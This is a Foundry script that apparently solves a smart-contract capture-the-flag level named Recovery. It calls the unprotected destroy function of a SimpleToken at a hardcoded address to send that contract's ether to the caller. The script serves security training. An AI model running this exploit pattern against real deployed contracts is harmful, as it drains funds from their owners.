// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Recovery.sol";
import "forge-std/Script.sol";

contract Solve is Script {
    function run() external {
        vm.startBroadcast();
        SimpleToken victim = SimpleToken(payable(0x47390985c44F5f843694Ef7e5f56AB6cE226afEB));
        victim.destroy(payable(tx.origin));
        vm.stopBroadcast();
    }
}